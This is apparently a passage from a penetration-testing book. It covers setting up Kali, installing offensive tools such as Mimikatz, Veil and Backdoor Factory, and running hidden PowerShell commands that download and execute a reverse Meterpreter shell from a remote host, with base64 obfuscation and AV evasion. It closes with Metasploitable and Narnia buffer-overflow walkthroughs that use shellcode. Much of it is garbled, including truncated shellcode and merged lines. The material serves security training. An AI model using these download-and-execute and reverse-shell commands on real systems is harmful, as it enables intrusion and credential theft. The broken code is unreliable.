Virtual Player/VirtualBox. Remember that it will be a gz-compressed and tar archived file, so make
sure to extract them first and load the vmx file.
Once Your Kali VM is Up and Running
‚óè Log in with the username root and the default password toor
‚óè Open a terminal
‚óè Change the password
‚óã passwd
‚óè Update the image
‚óã apt-get update
‚óã apt-get dist-upgrade
‚óè Setup Metasploit database
‚óã service postgresql start
‚óè Make postgresql database start on boot
‚óã update-rc.d postgresql enable
‚óè Start and stop the Metasploit service (this will setup the database.yml file for you)
‚óã service metasploit start
‚óã service metasploit stop
‚óè Install gedit
‚óã apt-get install gedit
‚óè Change the hostname - Many network admins look for systems named Kali in logs
like DHCP. It is best to follow the naming standard used by the company you are
testing
‚óã gedit /etc/hostname
‚ñ† Change the hostname (replace kali) and save
‚óã gedit /etc/hosts
‚ñ† Change the hostname (replace kali) and save
‚óã reboot
‚óè *Optional for Metasploit - Enable Logging
‚óã I list this as optional since logs get pretty big, but you have the ability
to log every command and result from Metasploit‚Äôs Command Line
Interface (CLI). This becomes very useful for bulk attack/queries or if
your client requires these logs. *If this is a fresh image, type
msfconsole first and exit before configuring logging to create the .msf4
folder.
‚óã From a command prompt, type:
‚ñ† echo ‚Äúspool /root/msf_console.log‚Äù >
/root/.msf4/msfconsole.rc
‚óã Logs will be stored at /root/msf_console.log
Tool Installation
The Backdoor Factory:
‚óè Patch PE, ELF, Mach-O binaries with shellcode.
‚óè git clone https://github.com/secretsquirrel/the-backdoor-factory /opt/the-backdoorfactory
‚óè cd the-backdoor-factory
‚óè ./install.sh
HTTPScreenShot
‚óè HTTPScreenshot is a tool for grabbing screenshots and HTML of large numbers of
websites.
‚óè pip install selenium
‚óè git clone https://github.com/breenmachine/httpscreenshot.git /opt/httpscreenshot
‚óè cd /opt/httpscreenshot
‚óè chmod +x install-dependencies.sh && ./install-dependencies.sh
‚óè HTTPScreenShot only works if you are running on a 64-bit Kali by default. If you
are running 32-bit PAE, install i686 phatomjs as follows:
‚óã wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs1.9.8-linux-i686.tar.bz2
‚óã bzip2 -d phantomjs-1.9.8-linux-i686.tar.bz2
‚óã tar xvf phantomjs-1.9.8-linux-i686.tar
‚óã cp phantomjs-1.9.8-linux-i686/bin/phantomjs /usr/bin/
SMBExec
‚óè A rapid psexec style attack with samba tools.
‚óè git clone https://github.com/pentestgeek/smbexec.git /opt/smbexec
‚óè cd /opt/smbexec && ./install.sh
‚óè Select 1 - Debian/Ubuntu and derivatives
‚óè Select all defaults
‚óè ./install.sh
‚óè Select 4 to compile smbexec binaries
‚óè After compilation, select 5 to exit
Masscan
‚óè This is the fastest Internet port scanner. It can scan the entire Internet in under six
minutes.
‚óè apt-get install git gcc make libpcap-dev
‚óè git clone https://github.com/robertdavidgraham/masscan.git /opt/masscan
‚óè cd /opt/masscan
‚óè make
‚óè make install
Gitrob
‚óè Reconnaissance tool for GitHub organizations
‚óè git clone https://github.com/michenriksen/gitrob.git /opt/gitrob
‚óè gem install bundler
‚óè service postgresql start
‚óè su postgres
‚óè createuser -s gitrob --pwprompt
‚óè createdb -O gitrob gitrob
‚óè exit
‚óè cd /opt/gitrob/bin
‚óè gem install gitrob
CMSmap
‚óè CMSmap is a python open source CMS (Content Management System) scanner that
automates the process of detecting security flaws
‚óè git clone https://github.com/Dionach/CMSmap /opt/CMSmap
WPScan
‚óè WordPress vulnerability scanner and brute-force tool
‚óè git clone https://github.com/wpscanteam/wpscan.git /opt/wpscan
‚óè cd /opt/wpscan && ./wpscan.rb --update
Eyewitness
‚óè EyeWitness is designed to take screenshots of websites, provide some server
header info, and identify default credentials if possible.
‚óè git clone https://github.com/ChrisTruncer/EyeWitness.git /opt/EyeWitness
Printer Exploits
‚óè Contains a number of commonly found printer exploits
‚óè git clone https://github.com/MooseDojo/praedasploit /opt/praedasploit
SQLMap
‚óè SQL Injection tool
‚óè git clone https://github.com/sqlmapproject/sqlmap /opt/sqlmap
Recon-ng
‚óè A full-featured web reconnaissance framework written in Python
‚óè git clone https://bitbucket.org/LaNMaSteR53/recon-ng.git /opt/recon-ng
Discover Scripts
‚óè Custom bash scripts used to automate various pentesting tasks.
‚óè git clone https://github.com/leebaird/discover.git /opt/discover
‚óè cd /opt/discover && ./setup.sh
BeEF Exploitation Framework
‚óè A cross-site scripting attack framework
‚óè cd /opt/
‚óè wget https://raw.github.com/beefproject/beef/a6a7536e/install-beef
‚óè chmod +x install-beef
‚óè ./install-beef
Responder
‚óè A LLMNR, NBT-NS and MDNS poisoner, with built-in
HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting
NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP
authentication. Responder will be used to gain NTLM challenge/response hashes
‚óè git clone https://github.com/SpiderLabs/Responder.git /opt/Responder
The Hacker Playbook 2 - Custom Scripts
‚óè A number of custom scripts written by myself for The Hacker Playbook 2.
‚óè git clone https://github.com/cheetz/Easy-P.git /opt/Easy-P
‚óè git clone https://github.com/cheetz/Password_Plus_One /opt/Password_Plus_One
‚óè git clone https://github.com/cheetz/PowerShell_Popup /opt/PowerShell_Popup
‚óè git clone https://github.com/cheetz/icmpshock /opt/icmpshock
‚óè git clone https://github.com/cheetz/brutescrape /opt/brutescrape
‚óè git clone https://www.github.com/cheetz/reddit_xss /opt/reddit_xss
The Hacker Playbook 2 - Forked Versions
‚óè Forked versions of PowerSploit and Powertools used in the book. Make sure you
clone your own repositories from the original sources.
‚óè git clone https://github.com/cheetz/PowerSploit /opt/HP_PowerSploit
‚óè git clone https://github.com/cheetz/PowerTools /opt/HP_PowerTools
‚óè git clone https://github.com/cheetz/nishang /opt/nishang
DSHashes:
‚óè Extracts user hashes in a user-friendly format for NTDSXtract
‚óè wget http://ptscripts.googlecode.com/svn/trunk/dshashes.py -O
/opt/NTDSXtract/dshashes.py
SPARTA:
‚óè A python GUI application which simplifies network infrastructure penetration
testing by aiding the penetration tester in the scanning and enumeration phase.
‚óè git clone https://github.com/secforce/sparta.git /opt/sparta
‚óè apt-get install python-elixir
‚óè apt-get install ldap-utils rwho rsh-client x11-apps finger
NoSQLMap
‚óè A automated pentesting toolset for MongoDB database servers and web
applications.
‚óè git clone https://github.com/tcstool/NoSQLMap.git /opt/NoSQLMap
Spiderfoot
‚óè Open Source Footprinting Tool
‚óè mkdir /opt/spiderfoot/ && cd /opt/spiderfoot
‚óè wget http://sourceforge.net/projects/spiderfoot/files/spiderfoot-2.3.0-
src.tar.gz/download
‚óè tar xzvf download
‚óè pip install lxml
‚óè pip install netaddr
‚óè pip install M2Crypto
‚óè pip install cherrypy
‚óè pip install mako
WCE
‚óè Windows Credential Editor (WCE) is used to pull passwords from memory
‚óè Download from: http://www.ampliasecurity.com/research/windows-credentialseditor/ and save to /opt/. For example:
‚óã wget
www.ampliasecurity.com/research/wce_v1_4beta_universal.zip
‚óã mkdir /opt/wce && unzip wce_v1* -d /opt/wce && rm wce_v1*.zip
Mimikatz
‚óè Used for pulling cleartext passwords from memory, Golden Ticket, skeleton key and
more
‚óè Grab the newest release from https://github.com/gentilkiwi/mimikatz/releases/latest
‚óã cd /opt/ && wget
http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip
‚óã unzip -d ./mimikatz mimikatz_trunk.zip
SET
‚óè Social Engineering Toolkit (SET) will be used for the social engineering campaigns
‚óè git clone https://github.com/trustedsec/social-engineer-toolkit/ /opt/set/
‚óè cd /opt/set && ./setup.py install
PowerSploit (PowerShell)
‚óè PowerShell scripts for post exploitation
‚óè git clone https://github.com/mattifestation/PowerSploit.git /opt/PowerSploit
‚óè cd /opt/PowerSploit && wget
https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py &&
wget
https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.
Nishang (PowerShell)
‚óè Collection of PowerShell scripts for exploitation and post exploitation
‚óè git clone https://github.com/samratashok/nishang /opt/nishang
Veil-Framework
‚óè A red team toolkit focused on evading detection. It currently contains Veil-Evasion
for generating AV-evading payloads, Veil-Catapult for delivering them to targets, and
Veil-PowerView for gaining situational awareness on Windows domains. Veil will be
used to create a python based Meterpreter executable.
‚óè git clone https://github.com/Veil-Framework/Veil /opt/Veil
‚óè cd /opt/Veil/ && ./Install.sh -c
Burp Suite Pro
‚óè Web Penetration Testing Tool
‚óè Download: http://portswigger.net/burp/proxy.html. I would highly recommend that
you buy the professional version. It is well worth the $299 price tag.
ZAP Proxy Pro
‚óè OWASP ZAP: An easy-to-use integrated penetration testing tool for discovering
vulnerabilities in web applications.
‚óè Download from: https://code.google.com/p/zaproxy/wiki/Downloads?tm=2
‚óè *Included by default in Kali Linux (owasp-zap)
Fuzzing Lists (SecLists)
‚óè These are scripts to use with Burp to fuzz parameters
‚óè git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists
Password Lists
‚óè For the different password lists, see the section: Special Teams - Cracking,
Exploits, and Tricks
Net-Creds Network Parsing
‚óè Parse PCAP files for username/passwords
‚óè git clone https://github.com/DanMcInerney/net-creds.git /opt/net-creds
Installing Firefox Add-ons
‚óè Web Developer Add-on: https://addons.mozilla.org/en-US/firefox/addon/webdeveloper/
‚óè Tamper Data: https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
‚óè Foxy Proxy: https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
‚óè User Agent Switcher: https://addons.mozilla.org/en-US/firefox/addon/user-agentswitcher/
Wifite
‚óè Attacks against WiFi networks
‚óè git clone https://github.com/derv82/wifite /opt/wifite
WIFIPhisher
‚óè Automated phishing attacks against WiFi networks
‚óè git clone https://github.com/sophron/wifiphisher.git /opt/wifiphisher
Phishing (Optional):
‚óè Phishing-Frenzy
‚óã git clone https://github.com/pentestgeek/phishing-frenzy.git
/var/www/phishing-frenzy
‚óè Custom List of Extras
‚óã git clone https://github.com/macubergeek/gitlist.git /opt/gitlist
*Remember to check http://thehackerplaybook.com/updates/ for any updates.
Windows VM
I highly recommend you also configure a Windows 7/8 Virtual Machine. This is because I have been
on many tests where an application will require Internet Explorer or a tool like Cain and Abel, which
will only work on one operating system. Remember, all of the PowerShell attacks will require you to
run the commands on your Windows hosts. The point is to always be prepared because you will save
yourself a lot of time and trouble having multiple operating systems available.
High level tools list addition to Windows
‚óè HxD (Hex Editor)
‚óè Evade (Used for AV Evasion)
‚óè Hyperion (Used for AV Evasion)
‚óè Metasploit
‚óè Nexpose/Nessus
‚óè Nmap
‚óè oclHashcat
‚óè Cain and Abel
‚óè Burp Suite Pro
‚óè Nishang
‚óè PowerSploit
‚óè Firefox (Add-ons)
‚óã Web Developer Add-on
‚óã Tamper Data
‚óã Foxy Proxy
‚óã User Agent Switcher
Setting Up Windows
Setting up a Windows common testing platform should help complement your Kali Linux host.
Remember to change your host names, disable NetBios if you don‚Äôt need it, and harden these boxes as
much as possible. The last thing you want is to get owned during an assessment.
There isn‚Äôt anything special that I setup on Windows, but usually I will install the following.
‚óè HxD http://mh-nexus.de/en/hxd/
‚óè Evade https://www.securepla.net/antivirus-now-you-see-me-now-you-dont
‚óè Hyperion http://www.nullsecurity.net/tools/binary.html
‚óã Download/install a Windows Compiler
http://sourceforge.net/projects/mingw/
‚óã Run ‚Äúmake‚Äù in the extracted Hyperion folder and you should have the
binary.
‚óè Download and install Metasploit http://www.Metasploit.com/
‚óè Download and install either Nessus or Nexpose
‚óã If you are buying your own software, you should probably look into
Nessus as it is much cheaper, but both work well
‚óè Download and install nmap http://nmap.org/download.html
‚óè Download and install oclHashcat http://hashcat.net/oclhashcat/
‚óè Download and install Cain and Abel http://www.oxid.it/cain.html
‚óè Download Burp Proxy Pro http://portswigger.net/burp/download.html
‚óè Download and extract Nishang: https://github.com/samratashok/nishang
‚óè Download and extract PowerSploit: https://github.com/mattifestation/PowerSploit/
‚óè Installing Firefox Addons
‚óã Web Developer Add-on: https://addons.mozilla.org/en-US/
firefox/addon/web-developer/
‚óã Tamper Data: https://addons.mozilla.org/en-US/firefox/
addon/tamper-data/
‚óã Foxy Proxy: https://addons.mozilla.org/en-US/firefox/
addon/foxyproxy-standard/
‚óã User Agent Switcher: https://addons.mozilla.org/en-US/
firefox/addon/user-agent-switcher/
Power Up With Powershell
PowerShell has really changed the game on penetration testing. If you don‚Äôt have any experience with
PowerShell, I would highly recommend you take some time and write some basic PowerShell scripts.
If you need something to help get you in the PowerShell game, take a look at this video:
‚óè Intro to PowerShell Scripting for Security: http://bit.ly/1MCb7EJ
The video is kind of long, but will get you some of the basics you need to get your PowerShelling off
the ground.
Why do I focus so much on PowerShell in this book? The benefits of PowerShell for a penetration
tester:
‚óè Installed by default on Windows 7+ machines
‚óè PowerShell scripts can run in memory
‚óè Almost never triggers antivirus
‚óè Utilizes .NET Framework classes
‚óè Takes advantage of credentials of the user (for querying Active Directory)
‚óè Can be used to manage Active Directory
‚óè Remotely executes PowerShell scripts
‚óè Makes scripting Windows attacks much easier
‚óè Many tools are now being built in PowerShell and understanding it will make you a
more powerful and efficient penetration tester
You can always drop into a PowerShell command from a Windows terminal prompt by typing
‚Äúpowershell‚Äù and get to the help menu by typing ‚Äúhelp‚Äù once inside PowerShell. Here are the basic
flags and settings used throughout the book:
‚óè -Exec Bypass: Bypass Security Execution Protection
‚óã This one is extremely important! By default, PowerShell has an
execution policy to not run PowerShell command/files. By running this
command you bypass any of those settings. Throughout the book we
will use this flag almost every time.
‚óè -NonI: Noninteractive Mode - PowerShell does not present an interactive prompt to
the user
‚óè -NoProfile (or -NoP): Enforces PowerShell console not to load the current user's
profile
‚óè -noexit: Do not exit shell after execution. This is important for scripts like
keyloggers, so that they continually run.
‚óè -W Hidden: Sets the window style for the session. This is so that the command
prompt stays hidden.
‚óè 32-bit or 64-bit PowerShell:
‚óã This is also very important. Some scripts are only meant to run on
their specified platform. So if you are on a 64bit box, you might need to
execute 64-bit PowerShell to run the command.
‚óã 32-bit PowerShell Execution: powershell.exe -NoP -NonI -WHidden -Exec Bypass
‚óã 64-bit PowerShell Execution:
%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -
NoP -NonI -W Hidden -Exec Bypass
To help you better understand what we will come across in the PowerShell adventures, here are some
of the common execution commands that will be used throughout this book:
The first command will download a PowerShell script from a web server and execute that script. In
many cases, we are going to download a Meterpreter PowerShell script on a victim target via a
command prompt:
‚óè Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('[PowerShell URL]'); [Parameters]
For example, if we want to execute a Meterpreter Shell on a target, we need to download this script:
‚óè https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1
We also need to know which parameters to use. The easiest way to find out what parameters you
might need is to read the source code of the PowerShell Script. Go visit the Invoke--Shellcode.ps1
file. If we look at the Invoke--Shellcode.ps1 file written by Mattifestation, we can see an example of
how to call a reverse-https Meterpreter shell.
Invoke--Shellcode.ps1
Our final PowerShell command will look like this:
‚óè Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploi-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -
Lhost 192.168.30.129 -Lport 80
This makes PowerShell extremely easy and powerful to use. Let‚Äôs look at a few more examples.
Let‚Äôs say you downloaded the same file onto the target. You don‚Äôt want to have to reach out to a web
page to automatically download and execute the file. To locally run it:
‚óè powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "& {ImportModule [Path and File of PowerShell Script]; [Parameters]}"
Lastly, throughout this book, I will regularly use base64 encoded PowerShell scripts both for
obfuscation and for compacting my code. To run an encoded PowerShell Script:
‚óè powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc [Base64 Code]
Hopefully, this makes using PowerShell pretty straightforward and usable in your own tests.
Easy-P
Because this book is so heavily invested in PowerShell attacks, I created a little script to make
PowerShell a little more accessible during a penetration test. Easy-P has some of the common
PowerShell tools I use and the ability to encode my scripts.
For every command, Easy-P will give you multiple ways to run the code both locally and remotely.
Note that all the remote PowerShell scripts are linked to either my code or to forked versions of other
people‚Äôs codes. I want to mention something here, which will be mentioned a couple more times
throughout the book: Remember to fork your own copies off of the original sources, so that you don‚Äôt
blindly run someone else‚Äôs code. You never know if someone is going to maliciously change the
PowerShell script randomly and now, either nothing works or even worse, your shells are going
somewhere else. Let‚Äôs dive into Easy-P to make your life much simpler.
‚óè cd /opt/Easy-P
‚óè python ./easy-p.py
THP Easy-P
One of the most common things I will do in this book is use PowerShell Meterpreter Scripts. Once
you execute the Easy-P script, select option 4. You will be presented with setting your localhost IP
and the port on which you want the Meterpreter script to connect back. Once that is done, you will
have an output similar to the following:
Example Easy-P Output
You will get four different outputs:
‚óè Download from the Internet and execute: Download a PowerShell script from a
website then execute that script. This is great when you only have a simple shell and
do not have the ability to download files.
‚óè Run from a local copy of the script: If you have already pushed a PowerShell file to
the system, it will output a command to import that PowerShell script and execute it.
‚óè Base64 encoded version of download and execute: If for some reason you want to
obfuscate your encoded scripts or you run into character limitations, this will base64
your code and give you the execution command.
‚óè Resource File: Lastly, you will be given the associated Resource File. A
Metasploit resource file is a quick way to automatically set up a handler for the
Meterpreter PowerShell script. Copy that resource script and save it to a file:
/opt/listener.rc.
All of the scripts are already configured to bypass execution policy, stay hidden, and run noninteractive. Take a look at all of the other menu choices in Easy-P, as it also has modules on Privilege
Escalation, Lateral Movement, Keylogging, PowerShell Meterpreter, and Change Users Execution
Policy. Feel free to fork my code and modify it to add all the PowerShell code you need.
Learning
This book is really geared toward those who have, at a minimum, some understanding of tools like
Nmap, Metasploit, Cain and Abel, aircrack and others. You should also have a high level of
understanding of attacks like buffer overflows and high-level languages like Python/Ruby.
If you need a quick refresher or need to do some testing, here is a little starter pack for you:
Metasploitable 2
One comment I received was that there were no beginner walk-throughs on how to use Metasploit or
fully test exploits using some of Metasploit‚Äôs features. This is where Metasploit 2 comes in as a great
test bed. Before we get started, we need to download the VMWare Image for Metasploitable 2.
Download:
http://sourceforge.net/projects/metasploitable/files/Metasploitable2/
Once you download Metasploitable 2, unzip it, and open it in VMware Player or Virtual Box, login
with the user account msfadmin and password msfadmin. Now, you have your vulnerable VM image
running.
LAB
Practice running Nmap, Masscan, or vulnerability tools against the vulnerable virtual machine. Once
you find the system vulnerable to an exploit, let‚Äôs get a shell on it. In our example, we found and are
going to take advantage of a flaw in vsftpd. So we can either do a search for the exploit (search
vsftpd) or we can go straight into the exploit.
‚óè msfconsole
‚óè use exploit/unix/ftp/vsftpd_234_backdoor (selects the exploit)
‚óè show options (shows all the configuration options)
‚óè set RHOST [IP] (sets the Metasploitable 2 IP)
‚óè exploit (runs the exploit)
Metasploit Example
We were successfully able to exploit this vulnerability and read the stored passwords with: cat
/etc/shadow. To further dig into Metasploitable 2, check out the Rapid7 guide:
https://community.rapid7.com/docs/DOC-1875.
There are a ton of different vulnerabilities on this virtual machine. Make sure you spend time learning
how to effectively use Metasploit and Meterpreter. If you are looking to get deeper into Metasploit, I
recommend:
http://www.amazon.com/Metasploit-The-Penetration-Testers-Guide/dp/159327288X.
Binary Exploitation
Just like in the first edition of The Hacker Playbook, this book does not go deeply into binary
exploitation, because this is a whole other topic that requires something like The Shellcoders
Handbook (http://amzn.to/1E3k89R) or Hacking: The Art of Exploitation, 2nd Edition
(http://amzn.to/1z8oThD). However, this doesn‚Äôt mean that you shouldn‚Äôt have an understanding of
buffer overflows and basic exploitation. Since all penetration testers should be able to ‚Äúscript‚Äù code,
they should also be able to read other exploitation code. You might find a module in Metasploit that
does not work and needs minor modifications or verification of what it does before you download an
exploit from the Internet.
There are a ton of different sites you can start with to get the basics down on binary exploitation. A
great place to learn is on a site called Over the Wire (http://overthewire.org/wargames/narnia/).
Over the Wire is an online CTF-style challenge that focuses on all aspects of hacking from binary to
web. In this chapter, we are only going focus on binary exploitation. If you have never done anything
like this before, I would take a couple of weekends to hammer away at this site. To get you started, I
will walk you through the first couple of challenges‚Äîhowever, it is up to you to continue down the
path.
Before you begin, study up a bit on:
‚óè Basic assembly and understanding registers
‚óè The basics on GDB (GNU Debugger)
‚óè Understand the different memory segments (the stack, heap, data, BSS, and code
segments)
‚óè Shellcode basics
Some resources that might help you start:
‚óè http://opensecuritytraining.info/IntroX86.html
‚óè http://www.reddit.com/r/hacking/comments/1wy610/exploit_tutorial_buffer_overflow‚óè https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-
stack-based-overflows/
‚óè http://www.lethalsecurity.com/wiki
‚óè http://opensecuritytraining.info/Exploits1.html
‚óè https://exploit-exercises.com/protostar/
Narnia Setup
(http://overthewire.org/wargames/narnia/)
Stage 1
Narnia is configured so that you SSH into their servers and all challenges are located under /narnia/.
Let‚Äôs walk through the first three examples. From a terminal prompt on Kali or using something like
Putty (http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html) on Windows:
‚óè ssh narnia0@narnia.labs.overthewire.org
‚óè Password: narnia0
‚óè cd /narnia/
Each challenge is laid out in a manner that shows you both the C code and the binary executable. For
challenge 0, we have both a narnia0 and narnia0.c file. Let‚Äôs take a look at the raw C code:
‚óè cat narnia0.c
Narnia 0 - Code
After taking a quick look at the code, we see the variable ‚Äúval‚Äù is assigned to the hex value of
‚ÄúAAAA‚Äù. Next, we see that it takes an input with buffer length of 20 bytes. A few lines later, we see
that scanf() expects 24 bytes maximum. This is your very simple buffer overflow type example. Now,
let‚Äôs run the executable, and, as a test, supply it 20 A‚Äôs and 4 B‚Äôs (because we know the hex value of
A = 41 and B = 42). So at the command prompt, it should look something like this:
‚óè narnia0@melinda:/narnia$ ./narnia0
‚óè Correct val's value from 0x41414141 -> 0xdeadbeef!
‚óè Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB
‚óè buf: AAAAAAAAAAAAAAAAAAAABBBB
‚óè val: 0x42424242
‚óè WAY OFF!!!!
Great! Since the HEX value at ‚Äúval‚Äù is 0x42424242 (42 translates to ASCII letter B), we know that
we are able to overwrite the value of ‚Äúval‚Äù in memory, which was previously 0x41414141. All we
have to do now is overwrite this value in memory with 0xdeadbeef. The thing to remember is that
everything must be written to the stack in Little Endian format
(http://en.wikipedia.org/wiki/Endianness), meaning the last byte in 0xdeadbeef must be the first byte
pushed to the stack to overwrite the value of ‚Äúval‚Äù. This is due to the First-In, Last-Out (FILO), or
Last-In, First-Out (LIFO) architecture of the target machine‚Äôs stack. So, to supply our 0xdeadbeef
value, we will have to write it as ‚Äú\xef\xbe\xad\xde‚Äù. The easiest way to only supply HEX values and
execute our A‚Äôs is using python and piping it into our narnia0 example. Let‚Äôs see this in action:
‚óè narnia0@melinda:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
‚óè Correct val's value from 0x41414141 -> 0xdeadbeef!
‚óè Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA?
‚óè val: 0xdeadbeef
Great x2! We now have written deadbeef in our ‚Äúval‚Äù variable. How can we run shell commands? If
we go back to our C code, we see that if we match deadbeef, /bin/sh gets called. So let‚Äôs take our
python code and try to read the key located at /etc/narnia_pass/narnia1:
‚óè narnia0@melinda:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat
/etc/narnia_pass/narnia1') | /narnia/narnia0
‚óè Correct ‚Äúval's‚Äù value from 0x41414141 -> 0xdeadbeef!
‚óè Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA?
‚óè val: 0xdeadbeef
‚óè [Answer to Stage 1]
Narnia 0 ‚Äì Exploit
If you were successful, you have defeated stage 1 and earned the password to the narnia1 account. We
need to log out and log into the newly gathered account.
Stage 2
After you finish each stage, you get the password to the next account. Let‚Äôs log into stage 2 using the
narnia1 account we just obtained.
Log into stage 2:
‚óè ssh narnia1@narnia.labs.overthewire.org
‚óè Password: [Password From Narnia 1]
‚óè cd /narnia/
‚óè cat narnia1
Narnia 1 - Code
Reading the C code, we see a couple of things immediately:
‚óè int (*ret)(); - is a pointer to ret to get it‚Äôs value
‚óè getenv - takes in an environment variable EGG and stores it to the variable ret
‚óè Calls ret()
If we can store shellcode into the environment variable EGG, then whatever shellcode is stored there
will be executed. The easy way to do this is to take the shellcode for /bin/sh and set it to an
environment variable EGG.
‚óè We will use the shellcode for /bin/sh from this example:
http://shell-storm.org/shellcode/files/shellcode-811.php
‚óè export EGG=`python -c 'print
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0‚óè ./narnia1
‚óè cat /etc/narnia_pass/narnia2
Narnia 1 - Exploit
We now have the password to the narnia2 account and can move on to stage 3.
Stage 3
For stage 3:
‚óè ssh narnia2@narnia.labs.overthewire.org
‚óè Password: [Password from Narnia 2]
‚óè cd /narnia/
‚óè cat narnia2.c
Looking at the C code, we see the following:
‚óè char buf[128];
‚óè if(argc == 1){
‚óè printf("Usage: %s argument\n", argv[0]);
‚óè exit(1);
‚óè }
‚óè strcpy(buf,argv[1]);
‚óè printf("%s", buf);
By looking at the code, we see that it takes an argument and copies it into buf. We see that there is a
char buf of 128 bytes, so let‚Äôs start by sending 200 characters:
‚óè narnia2@melinda:/narnia$ ./narnia2 `python -c 'print "A" * 200'`
‚óè Segmentation fault
We just verified that sending 200 characters causes the application to have a segmentation fault. We
need to identify how many bytes before we overwrite EIP. We can do this with a Metasploit module
called pattern_create.rb. This module creates a unique string and in our example below, we will
create a string of 200 bytes. Since this string never repeats, we can identify exactly where our
program overflows EIP.
‚óè /usr/share/metasploit-framework/tools/pattern_create.rb 200
‚óè Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9ANow, let‚Äôs run our new custom unique string through narnia2 to see how many bytes it takes before
we cause a segmentation fault. To see the exact results of our segmentation fault, we will have to use
a debugger. By default, Linux systems have a debugger called gdb. Although it isn‚Äôt the easiest
debugger to use, it is extremely powerful:
‚óè gdb ./narnia2 -q
‚óè run `python -c 'print
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9AThe result of the query is:
Narnia 2 ‚Äì Exploit
‚óè Program received signal SIGSEGV, Segmentation fault.
‚óè 0x37654136 in ?? ()
The output from our command is 0x37634136. We need to look in our original string to find that exact
value. To find the exact number of bytes where the segment fault was caused, we can use Metasploit‚Äôs
pattern_offset.rb:
‚óè /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37654136
‚óè [*] Exact match at offset 140
This shows that after 140 characters, we can control EIP. To verify this, we can run narnia2 with an
input of 140 bytes and we should be able to overwrite EIP with an extra 4 bytes. We are going to use
a debugger to watch it happen in memory.
The output should look like the following:
‚óè cd /narnia
‚óè gdb ./narnia2 -q
‚óè (gdb) run `python -c 'print "A" * 140 + "B" * 4'`
‚óã Starting program: /games/narnia/narnia2 `python -c 'print "A" * 140
+ "B" * 4'`
‚óã Program received signal SIGSEGV, Segmentation fault.
‚óã 0x42424242 in ?? ()
‚óè (gdb) info registers
‚óã eax 0x0 0
‚óã ecx 0x0 0
‚óã edx 0xf7fcb898 -134432616
‚óã ebx 0xf7fca000 -134438912
‚óã esp 0xffffd640 0xffffd640
‚óã ebp 0x41414141 0x41414141
‚óã esi 0x0 0
‚óã edi 0x0 0
‚óã eip 0x42424242 0x42424242
We were able to overwrite EIP with all ‚ÄúB‚Äù (or hex equivalent 0x42) characters, which is the pointer
to the code that will be executed next by the processor. If we can point EIP to an area of shellcode,
we can compromise the system. Where might you find shellcode? You can always generate your own
or you can grab shellcode from here:
http://shell-storm.org/shellcode/.
In this example, we are going to use Linux/x86 - execve(/bin/sh) - 28 bytes. We know our shellcode
is 28 bytes and our payload needs to be 144 bytes in length. I also want to change my A‚Äôs to NOPs or
x90, which means if we land on a NOP, it will continue until we hit executable code. After playing
around a little with the space, I created the following:
‚óè cd /narnia
‚óè gdb ./narnia2 -q
‚óè run `python -c 'print "\x90" * 50 +
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0+ "\x90" * 67 + "BBBB"'`
‚óã Starting program: /games/narnia/narnia2 `python -c 'print "\x90" * 50
+
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53+ "\x90" * 67 + "BBBB"'`
‚óã Program received signal SIGSEGV, Segmentation fault.
‚óã 0x42424242 in ?? ()
‚óè (gdb) info registers eip
‚óã eip 0x42424242 0x42424242
We successfully have control of EIP with our shellcode and NOPs. Now, we need to just drop in
anywhere before our NOPs and we should have a /bin/sh shell. To see what is stored in the memory,
after we seg fault, type:
‚óè x/250x $esp
Scrolling through, you should see something like the following:
NOP Sled
We see our initial NOPs (x90), followed by our shellcode, more NOPs, and lastly, our BBBB. We
need to change our BBBB to an address in our NOP Sled to execute our shellcode. An easy address is
0xffffd850‚Äîa stack address which points to our first set of NOPs. Let‚Äôs give it a try and don‚Äôt forget
Little Endian.
‚óè (gdb) run `python -c 'print "\x90" * 50 +
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0+ "\x90" * 67 + "\x50\xd8\xff\xff"'`
‚óã Starting program: /games/narnia/narnia2 `python -c 'print "\x90" * 50
+
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53+ "\x90" * 67 + "\x50\xd8\xff\xff"'`
‚óã process 5823 is executing new program: /bin/dash
‚óè $ cat /etc/narnia_pass/narnia3
